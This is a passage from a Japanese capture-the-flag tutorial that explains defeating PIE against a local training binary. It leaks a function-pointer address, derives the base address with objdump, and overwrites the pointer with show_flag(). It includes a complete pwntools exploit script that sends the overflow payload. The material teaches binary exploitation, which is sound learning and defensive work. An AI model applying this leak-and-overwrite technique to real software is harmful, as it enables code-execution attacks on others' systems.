`my_monster.cry`の関数ポインタを`show_flag()`が配置されているアドレスに書き替えることで、`my_monster.cry()`が呼び出された時に`show_flag()`を呼び出すことができます。

`show_flag()`が配置されているアドレスがわかればいいのですが、PIEというセキュリティ機構の考慮が必要です。

PIE有効下ではまず最初にランダムなアドレス(ベースアドレス)を決定し、そのアドレスから実行ファイルがメモリに配置されるようになります。

そのため関数が配置されるアドレスも毎回変化します。

```python
# 毎回変化するベースアドレス
base_address = 0x562ae54be000
# ある関数のオフセット
function_offset = 0x1568
# 関数が実際にメモリに配置されるアドレス
function_address = base_address + function_offset = 0x562ae54bf568
```

そのためベースアドレスがわからなければ関数が実際に配置されるアドレスもわかりません。どうやってベースアドレスを求めたらいいのでしょうか。

ここでプログラムで出力されるメモリに注目します。

```
+--------+--------------------+----------------------+
|name    | 0x0000000000000000 |                      |
|        | 0x0000000000000000 |                      |
|HP      | 0x0000000000000064 |                  100 |
|ATK     | 0x000000000000000a |                   10 |
|cry()   | 0x0000559b85ecd34e |                      |
+--------+--------------------+----------------------+
```

このように、出力には`my_monster.cry`のアドレス`0x0000559b85ecd34e`が含まれています。これは先ほどの例で言うと`function_address`にあたります。

`function_offset`がわかれば、式から`function_address - function_offset = base_address`と求めることができます。

関数のオフセットは`objdump`などのツールを用いて調べることができます。この時点で`my_monster.cry`に入っているのは`my_monster_cry()`なのでその関数のオフセットを調べます。

```
$ objdump -d vuln
...
000000000000134e <my_monster_cry>:
...
```

```
>>> hex(0x0000559b85ecd34e - 0x00000000000134e)
'0x559b85ecc000'
```

この`0x559b85ecc000`が今回のベースアドレスです。これに`show_flag()`のオフセットを足せば`show_flag()`のアドレスになります。

`my_monster.cry`を`show_flag()`に書き替えればよいという話でしたが、書き替える内容が動的に変化するのでncで解くのは厳しいです。

Pythonのpwntoolsを利用することでそのような操作を簡単に書くことができます。

```python
from pwn import *

file = "./vuln"

program = ELF(file)

io = process(file)

# my_monster.cryのアドレスを取得する
io.recvuntil("|cry()   | 0x")
cry_addr = int(io.recvuntil(" ")[:-1], 16)

# ベースアドレスを求める (pwntoolsのELFクラスでは一度ベースアドレスを入れると後は自動で補完してくれる)
program.address = cry_addr - program.sym["my_monster_cry"]

# my_monster.cryを書き換える
payload = b"A" * 0x8  # name
payload += b"A" * 0x8
payload += b"A" * 0x8 # HP
payload += b"A" * 0x8 # ATK
# p64で整数のアドレスを64bitのバイト列に変換する
payload += p64(program.sym["show_flag"]) # cry()
io.sendlineafter("Input name: ", payload)

io.interactive()
```

